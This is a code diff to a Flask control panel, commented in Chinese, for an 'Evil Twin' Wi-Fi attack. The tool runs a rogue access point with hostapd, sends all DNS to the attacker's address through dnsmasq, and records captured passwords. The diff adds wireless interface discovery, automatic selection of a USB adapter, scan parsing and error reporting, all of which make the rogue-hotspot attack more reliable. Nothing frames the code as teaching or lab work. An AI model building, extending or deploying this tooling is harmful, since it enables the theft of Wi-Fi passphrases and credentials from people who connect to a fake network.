@@ -4,10 +4,44 @@ import sqlite3
 import subprocess
 import os
 import json
+import re
+import sys
 from datetime import datetime
 
 app = Flask(__name__)
 DB_PATH = 'evil_twin.db'
+LOG_PATH = 'evil_twin.log'
+
+def run_cmd(args, timeout=8):
+    """Run a command and always capture stdout/stderr for diagnostics."""
+    try:
+        return subprocess.run(args, capture_output=True, text=True, timeout=timeout)
+    except subprocess.TimeoutExpired as e:
+        r = subprocess.CompletedProcess(args, 124, e.stdout or '', e.stderr or '')
+        r.stderr = (r.stderr + '\nCommand timed out').strip()
+        return r
+    except Exception as e:
+        return subprocess.CompletedProcess(args, 1, '', str(e))
+
+def ensure_runtime_permissions():
+    """Fail early when sudo-created files are not writable by the current user."""
+    project_dir = os.path.abspath(os.path.dirname(__file__) or '.')
+    for path in (DB_PATH, LOG_PATH):
+        abs_path = os.path.abspath(path)
+        if os.path.exists(abs_path) and not os.access(abs_path, os.W_OK):
+            msg = (
+                f"Permission denied: {abs_path}\n"
+                f"请执行 sudo chown -R $USER:$USER {project_dir}"
+            )
+            print(msg, file=sys.stderr)
+            raise SystemExit(msg)
+        if not os.path.exists(abs_path) and not os.access(os.path.dirname(abs_path) or '.', os.W_OK):
+            msg = (
+                f"Permission denied: cannot create {abs_path}\n"
+                f"请执行 sudo chown -R $USER:$USER {project_dir}"
+            )
+            print(msg, file=sys.stderr)
+            raise SystemExit(msg)
 
 def get_db():
     conn = sqlite3.connect(DB_PATH)
@@ -16,11 +50,156 @@ def get_db():
     conn.execute("PRAGMA synchronous=NORMAL")
     return conn
 
+def get_default_route_ifaces():
+    r = run_cmd(['ip', 'route', 'show', 'default'], timeout=5)
+    ifaces = set()
+    for line in r.stdout.splitlines():
+        parts = line.split()
+        if 'dev' in parts:
+            idx = parts.index('dev')
+            if idx + 1 < len(parts):
+                ifaces.add(parts[idx + 1])
+    return ifaces
+
+def get_ipv4_addresses(iface):
+    r = run_cmd(['ip', '-o', '-4', 'addr', 'show', 'dev', iface], timeout=5)
+    addrs = []
+    for line in r.stdout.splitlines():
+        parts = line.split()
+        if 'inet' in parts:
+            idx = parts.index('inet')
+            if idx + 1 < len(parts):
+                addrs.append(parts[idx + 1])
+    return addrs
+
+def get_link_state(iface):
+    r = run_cmd(['ip', '-o', 'link', 'show', 'dev', iface], timeout=5)
+    m = re.search(r'\bstate\s+(\S+)', r.stdout)
+    return m.group(1) if m else 'UNKNOWN'
+
+def get_connected_ssid(iface):
+    r = run_cmd(['iw', 'dev', iface, 'link'], timeout=5)
+    ssid = ''
+    connected = False
+    if r.returncode == 0:
+        for line in r.stdout.splitlines():
+            s = line.strip()
+            if s.startswith('Connected to '):
+                connected = True
+            elif s.startswith('SSID:'):
+                ssid = s.split(':', 1)[1].strip()
+    return connected, ssid
+
+def is_usb_interface(iface):
+    try:
+        device_path = os.path.realpath(os.path.join('/sys/class/net', iface, 'device'))
+        return '/usb' in device_path.lower() or iface.startswith('wlx')
+    except Exception:
+        return iface.startswith('wlx')
+
+def get_usb_wifi_diagnostics():
+    r = run_cmd(['lsusb'], timeout=5)
+    devices = []
+    patterns = ('netgear', 'mediatek', 'mt7925', 'wireless')
+    for line in r.stdout.splitlines():
+        lower = line.lower()
+        if any(p in lower for p in patterns) or '0846:9072' in lower:
+            devices.append(line.strip())
+    return {
+        'lsusb_available': r.returncode == 0,
+        'lsusb_error': r.stderr.strip(),
+        'usb_wifi_detected': bool(devices),
+        'usb_devices': devices,
+    }
+
+def discover_wireless_interfaces():
+    names = []
+    iw_result = run_cmd(['iw', 'dev'], timeout=5)
+    if iw_result.returncode == 0:
+        for line in iw_result.stdout.splitlines():
+            if line.strip().startswith('Interface '):
+                name = line.strip().split()[-1]
+                if name and name not in names:
+                    names.append(name)
+
+    if not names:
+        try:
+            for entry in os.listdir('/sys/class/net/'):
+                wireless_dir = os.path.join('/sys/class/net/', entry, 'wireless')
+                if os.path.isdir(wireless_dir) and entry not in names:
+                    names.append(entry)
+        except Exception:
+            pass
+
+    default_ifaces = get_default_route_ifaces()
+    interfaces = []
+    for name in names:
+        connected, ssid = get_connected_ssid(name)
+        ips = get_ipv4_addresses(name)
+        interfaces.append({
+            'name': name,
+            'state': get_link_state(name),
+            'connected': connected,
+            'ssid': ssid,
+            'ips': ips,
+            'has_ip': bool(ips),
+            'default_route': name in default_ifaces,
+            'is_usb_likely': is_usb_interface(name),
+            'recommended': False,
+        })
+
+    recommended = choose_recommended_interface(interfaces)
+    for iface in interfaces:
+        iface['recommended'] = iface['name'] == recommended
+
+    diag = get_usb_wifi_diagnostics()
+    usb_interface_present = any(i['is_usb_likely'] for i in interfaces)
+    diag.update({
+        'iw_available': iw_result.returncode == 0,
+        'iw_error': iw_result.stderr.strip(),
+        'iw_created_wireless_interface': bool(interfaces),
+        'driver_warning': (
+            'USB WiFi 已识别但驱动未创建接口，可能需要重新插拔 USB 网卡或冷重启。'
+            if diag['usb_wifi_detected'] and not usb_interface_present else ''
+        )
+    })
+    return interfaces, recommended, diag
+
+def choose_recommended_interface(interfaces):
+    if not interfaces:
+        return ''
+    candidates = [i for i in interfaces if not i['default_route'] and not i['connected']]
+    usb_candidates = [i for i in candidates if i['is_usb_likely']]
+    if usb_candidates:
+        return usb_candidates[0]['name']
+    if candidates:
+        return candidates[0]['name']
+    non_default = [i for i in interfaces if not i['default_route']]
+    if non_default:
+        return non_default[0]['name']
+    return interfaces[0]['name']
+
+def ensure_valid_network_interface():
+    conn = get_db()
+    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
+    saved = config['network_interface'] if config else ''
+    interfaces, recommended, diag = discover_wireless_interfaces()
+    names = [i['name'] for i in interfaces]
+    selected = saved if saved in names else recommended
+    changed = bool(selected and selected != saved)
+    if changed:
+        conn.execute('UPDATE config SET network_interface = ? WHERE id = 1', (selected,))
+        conn.commit()
+        app.logger.info('network_interface auto-selected: saved=%s selected=%s', saved, selected)
+    conn.close()
+    return selected, saved, changed, interfaces, recommended, diag
+
 # ==================== 页面路由 ====================
 
 @app.route('/')
 def index():
     """管理后台首页"""
+    ensure_valid_network_interface()
     conn = get_db()
     config = conn.execute('SELECT * FROM config WHERE id = 1').fetchone()
     password_count = conn.execute('SELECT COUNT(*) as count FROM password_logs').fetchone()['count']
@@ -56,6 +235,9 @@ def manage_config():
     conn = get_db()
     
     if request.method == 'GET':
+        conn.close()
+        ensure_valid_network_interface()
+        conn = get_db()
         config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
         conn.close()
         return jsonify(dict(config))
@@ -63,10 +245,13 @@ def manage_config():
     elif request.method == 'POST':
         data = request.json
         if data is None:
+            conn.close()
             return jsonify({'status': 'error', 'message': '无效的JSON数据'}), 400
+        old_config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
+        old_iface = old_config['network_interface'] if old_config else ''
         evil_ssid = data.get('evil_ssid', 'Free_WiFi')
         evil_channel = data.get('evil_channel', 6)
-        network_interface = data.get('network_interface', 'wlan0')
+        network_interface = data.get('network_interface', '')
         evil_passphrase = data.get('evil_passphrase', '12345678')
         
         conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ?, evil_passphrase = ? WHERE id = 1', 
@@ -75,7 +260,8 @@ def manage_config():
         conn.close()
         
         # 如果热点正在运行，重启hostapd以应用新配置
-        restart_hotspot()
+        if is_process_running('hostapd'):
+            restart_hotspot(old_iface)
         
         return jsonify({'status': 'success', 'message': '配置已更新'})
 
@@ -117,8 +303,8 @@ def clear_macs():
 def get_status():
     """获取系统运行状态"""
     # 检查hostapd是否运行
-    hostapd_running = subprocess.run(['pgrep', 'hostapd'], capture_output=True).returncode == 0
-    dnsmasq_running = subprocess.run(['pgrep', 'dnsmasq'], capture_output=True).returncode == 0
+    hostapd_running = run_cmd(['pgrep', 'hostapd']).returncode == 0
+    dnsmasq_running = run_cmd(['pgrep', 'dnsmasq']).returncode == 0
     
     return jsonify({
         'hostapd': hostapd_running,
@@ -141,72 +327,74 @@ def stop_attack():
 @app.route('/api/interfaces', methods=['GET'])
 def get_interfaces():
     """自动扫描无线网卡口"""
-    ifaces = []
-    # 方法1: iw dev (最可靠)
-    try:
-        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
-        for line in r.stdout.splitlines():
-            if 'Interface' in line:
-                name = line.strip().split()[-1]
-                if name:
-                    ifaces.append(name)
-    except:
-        pass
-    
-    # 方法2: 检查 /sys/class/net/ (iw 不可用时)
-    if not ifaces:
-        try:
-            for entry in os.listdir('/sys/class/net/'):
-                uevent = os.path.join('/sys/class/net/', entry, 'uevent')
-                if os.path.exists(uevent):
-                    with open(uevent) as f:
-                        content = f.read()
-                    if 'DEVTYPE=wlan' in content:
-                        ifaces.append(entry)
-        except:
-            pass
-    
-    return jsonify(ifaces)
+    selected, saved, changed, interfaces, recommended, diagnostics = ensure_valid_network_interface()
+    return jsonify({
+        'interfaces': interfaces,
+        'names': [i['name'] for i in interfaces],
+        'current': selected,
+        'saved': saved,
+        'changed': changed,
+        'recommended': recommended,
+        'diagnostics': diagnostics,
+    })
 
 @app.route('/api/scan', methods=['POST'])
 def scan_wifi():
-    """扫描周围 WiFi 网络 — 优先 iw，失败时 fallback 到 Windows netsh"""
-    conn = get_db()
-    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
-    conn.close()
-    iface = config['network_interface'] if config else 'wlan0'
+    """扫描周围 WiFi 网络 — 优先 iw，失败时 fallback 到 iwlist"""
+    iface, saved, changed, interfaces, recommended, diagnostics = ensure_valid_network_interface()
+    if not iface:
+        return jsonify({
+            'status': 'error',
+            'message': '未检测到可用无线网卡',
+            'stderr': diagnostics.get('iw_error') or diagnostics.get('lsusb_error') or '',
+            'diagnostics': diagnostics,
+        }), 200
     
     aps = []
+    errors = []
+
+    iface_info = next((i for i in interfaces if i['name'] == iface), None)
+    if iface_info and iface_info['default_route']:
+        errors.append(f'{iface} 是默认路由网卡，正在用于服务器联网/SSH；仅在用户明确选择它时才会操作。')
     
     # 方法1: Linux iw scan
-    try:
-        r = subprocess.run(
-            ['sudo', 'iw', 'dev', iface, 'scan'],
-            capture_output=True, text=True, timeout=10
-        )
-        if r.returncode == 0:
-            aps = parse_iw_scan(r.stdout)
-    except:
-        pass
+    up_result = run_cmd(['sudo', 'ip', 'link', 'set', iface, 'up'], timeout=8)
+    if up_result.returncode != 0:
+        app.logger.warning('ip link set %s up failed: %s', iface, up_result.stderr.strip())
+        return jsonify({
+            'status': 'error',
+            'message': f'网卡 {iface} 启用失败',
+            'stderr': up_result.stderr.strip(),
+            'stdout': up_result.stdout.strip(),
+            'interface': iface,
+        }), 200
+
+    r = run_cmd(['sudo', 'iw', 'dev', iface, 'scan'], timeout=15)
+    if r.returncode == 0:
+        aps = parse_iw_scan(r.stdout)
+    if r.returncode != 0 or not aps:
+        errors.append(f"iw scan failed/empty: {r.stderr.strip() or 'empty result'}")
+        app.logger.info('iw scan fallback for %s: returncode=%s stderr=%s aps=%s', iface, r.returncode, r.stderr.strip(), len(aps))
     
-    # 方法2: Windows netsh fallback (WSL 可直接调 Windows 程序)
+    # 方法2: Linux iwlist fallback
     if not aps:
-        try:
-            netsh = '/mnt/c/Windows/System32/netsh.exe'
-            r = subprocess.run(
-                [netsh, 'wlan', 'show', 'networks', 'mode=bssid'],
-                capture_output=True, text=True, timeout=15
-            )
-            if r.returncode == 0:
-                aps = parse_netsh_output(r.stdout)
-        except:
-            pass
+        r2 = run_cmd(['sudo', 'iwlist', iface, 'scanning'], timeout=20)
+        if r2.returncode == 0:
+            aps = parse_iwlist_scan(r2.stdout)
+        if r2.returncode != 0 or not aps:
+            errors.append(f"iwlist scan failed/empty: {r2.stderr.strip() or 'empty result'}")
+            app.logger.info('iwlist scan failed/empty for %s: returncode=%s stderr=%s aps=%s', iface, r2.returncode, r2.stderr.strip(), len(aps))
     
     if not aps:
-        return jsonify({'status': 'error', 'message': '未发现任何 WiFi 网络，请检查网卡'}), 200
+        return jsonify({
+            'status': 'error',
+            'message': f'未发现任何 WiFi 网络，请检查网卡 {iface}',
+            'stderr': '\n'.join(errors),
+            'interface': iface,
+        }), 200
     
     aps.sort(key=lambda x: x['signal'], reverse=True)
-    return jsonify({'status': 'success', 'results': aps, 'count': len(aps)})
+    return jsonify({'status': 'success', 'results': aps, 'count': len(aps), 'interface': iface, 'warnings': errors})
 
 
 def parse_iw_scan(stdout):
@@ -240,6 +428,72 @@ def parse_iw_scan(stdout):
             current['security'] = 'WPA'
     if current and current.get('ssid'):
         aps.append(current)
+    return aps
+
+def parse_iwlist_scan(stdout):
+    """解析 iwlist <iface> scanning 输出，返回前端兼容字段。"""
+    aps = []
+    current = None
+
+    def finish_current():
+        if current and current.get('ssid'):
+            if current['security'] == 'UNKNOWN':
+                current['security'] = 'OPEN'
+            aps.append(current.copy())
+
+    for line in stdout.splitlines():
+        stripped = line.strip()
+        if 'Cell ' in stripped and 'Address:' in stripped:
+            finish_current()
+            bssid = stripped.split('Address:', 1)[1].strip().upper()
+            current = {
+                'bssid': bssid,
+                'ssid': '',
+                'channel': 0,
+                'signal': -99,
+                'security': 'UNKNOWN',
+                'frequency': 0,
+            }
+            continue
+
+        if current is None:
+            continue
+
+        if stripped.startswith('ESSID:'):
+            ssid = stripped.split(':', 1)[1].strip().strip('"')
+            current['ssid'] = ssid if ssid else '<隐藏>'
+        elif stripped.startswith('Channel:'):
+            try:
+                current['channel'] = int(stripped.split(':', 1)[1].strip())
+            except ValueError:
+                pass
+        elif stripped.startswith('Frequency:'):
+            freq_match = re.search(r'Frequency:([0-9.]+)\s*GHz', stripped)
+            chan_match = re.search(r'\(Channel\s+(\d+)\)', stripped)
+            if freq_match:
+                current['frequency'] = int(float(freq_match.group(1)) * 1000)
+            if chan_match:
+                current['channel'] = int(chan_match.group(1))
+            elif current['frequency']:
+                current['channel'] = freq_to_channel(current['frequency'])
+        elif 'Signal level=' in stripped:
+            signal_match = re.search(r'Signal level=(-?\d+)', stripped)
+            if signal_match:
+                current['signal'] = int(signal_match.group(1))
+        elif stripped.startswith('Quality=') and current['signal'] == -99:
+            quality_match = re.search(r'Quality=(\d+)/(\d+)', stripped)
+            if quality_match:
+                quality = int(quality_match.group(1)) / max(int(quality_match.group(2)), 1)
+                current['signal'] = round(-100 + quality * 60, 1)
+        elif stripped.startswith('Encryption key:'):
+            current['security'] = 'WEP' if stripped.endswith('on') else 'OPEN'
+        elif 'WPA2' in stripped or 'IEEE 802.11i' in stripped or 'RSN' in stripped:
+            current['security'] = 'WPA2'
+        elif 'WPA Version' in stripped or 'WPA' in stripped:
+            if current['security'] != 'WPA2':
+                current['security'] = 'WPA'
+
+    finish_current()
     return aps
 
 
@@ -347,6 +601,7 @@ def capture():
 
 def start_evil_twin():
     """启动Evil Twin攻击"""
+    ensure_valid_network_interface()
     
     # 获取配置
     conn = get_db()
@@ -358,8 +613,8 @@ def start_evil_twin():
     iface = config['network_interface']
     passphrase = config['evil_passphrase'] if config['evil_passphrase'] else '12345678'
     
-    # 1. 停止可能冲突的服务
-    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
+    if not iface:
+        return {'status': 'error', 'message': '未检测到可用无线网卡'}
     
     # 2. 配置hostapd
     hostapd_conf = f"""
@@ -389,8 +644,14 @@ address=/#/192.168.4.1
         f.write(dnsmasq_conf)
     
     # 4. 设置网卡IP
-    subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.4.1/24', 'dev', iface], capture_output=True)
-    subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], capture_output=True)
+    run_cmd(['sudo', 'ip', 'addr', 'add', '192.168.4.1/24', 'dev', iface])
+    up_result = run_cmd(['sudo', 'ip', 'link', 'set', iface, 'up'])
+    if up_result.returncode != 0:
+        return {
+            'status': 'error',
+            'message': f'网卡 {iface} 启用失败',
+            'stderr': up_result.stderr.strip(),
+        }
     
     # 5. 启动服务
     subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
@@ -403,25 +664,30 @@ address=/#/192.168.4.1
     
     return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}
 
-def stop_evil_twin():
+def is_process_running(name):
+    return run_cmd(['pgrep', name], timeout=5).returncode == 0
+
+def stop_evil_twin(iface_override=None):
     """停止Evil Twin攻击"""
     conn = get_db()
     config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
     conn.close()
-    iface = config['network_interface'] if config else 'wlan0'
+    iface = iface_override or (config['network_interface'] if config else '')
     
-    subprocess.run(['sudo', 'pkill', 'hostapd'], capture_output=True)
-    subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
-    subprocess.run(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface], capture_output=True)
+    run_cmd(['sudo', 'pkill', 'hostapd'])
+    run_cmd(['sudo', 'pkill', 'dnsmasq'])
+    if iface:
+        run_cmd(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface])
     return {'status': 'success', 'message': '攻击已停止'}
 
-def restart_hotspot():
+def restart_hotspot(old_iface=None):
     """重启热点以应用新配置"""
-    stop_evil_twin()
+    stop_evil_twin(old_iface)
     start_evil_twin()
 
 if __name__ == '__main__':
     import logging, atexit
+    ensure_runtime_permissions()
 
     # 访问日志写到文件（不刷屏），每天轮转
     capture_log = logging.getLogger('capture')
